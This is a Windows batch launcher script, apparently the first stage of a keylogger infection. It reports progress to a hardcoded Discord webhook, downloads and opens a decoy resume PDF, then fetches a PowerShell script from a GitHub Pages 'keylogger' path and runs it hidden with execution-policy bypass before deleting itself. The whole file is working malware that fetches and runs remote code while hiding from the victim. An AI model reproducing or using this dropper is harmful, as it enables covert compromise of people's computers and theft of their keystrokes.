@echo off

REM Define webhook URL
set "API_URL=https://discord.com/api/webhooks/1456756375722922189/nd6mCxBhCyrlQ305MWqFlPTGKx_AEV0yEfEFoPRUar4uHOoComIUFckjt_ZvuCNwe7aQ"

REM Define first control message log to send
set "MESSAGE=**LAUNCHER.cmd** has **successfully started** the script!"

REM Send first control POST request message log to Discord webhook
powershell -NoProfile -WindowStyle Hidden -Command ^
  "$body = @{ content = '%MESSAGE%' } | ConvertTo-Json; Invoke-RestMethod -Uri '%API_URL%' -Method Post -Body $body -ContentType 'application/json'"

REM Define document variables
set "DOCUMENT_URL=https://mynewaccount-website.github.io/keylogger/resumen.pdf"
set "DOCUMENT_PATH=%TEMP%\resumen.pdf"

REM Download document
powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%DOCUMENT_URL%' -OutFile '%DOCUMENT_PATH%'"

REM Run the downloaded document
start "" "%DOCUMENT_PATH%"

REM Define script variables
set "SCRIPT_URL=https://mynewaccount-website.github.io/keylogger/python_setup.ps1"
set "SCRIPT_PATH=%TEMP%\python_setup.ps1"

REM Download the PowerShell script
powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_PATH%'"

REM Waiting for download
timeout /T 5 /NOBREAK > nul

REM Run the downloaded script silently
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File \"\"%SCRIPT_PATH%\"\"' -WindowStyle Hidden"

REM Waiting to finish all the processes
timeout /T 5 /NOBREAK > nul

REM Define second control message log to send
set "MESSAGE=**LAUNCHER.cmd** has **successfully finished** the script!"

REM Send second control POST request message log to Discord webhook
powershell -NoProfile -WindowStyle Hidden -Command ^
  "$body = @{ content = '%MESSAGE%' } | ConvertTo-Json; Invoke-RestMethod -Uri '%API_URL%' -Method Post -Body $body -ContentType 'application/json'"

REM Auto-delete / cleanup
set "THIS_SCRIPT_PATH=%~nx0"
del /F %THIS_SCRIPT_PATH%

exit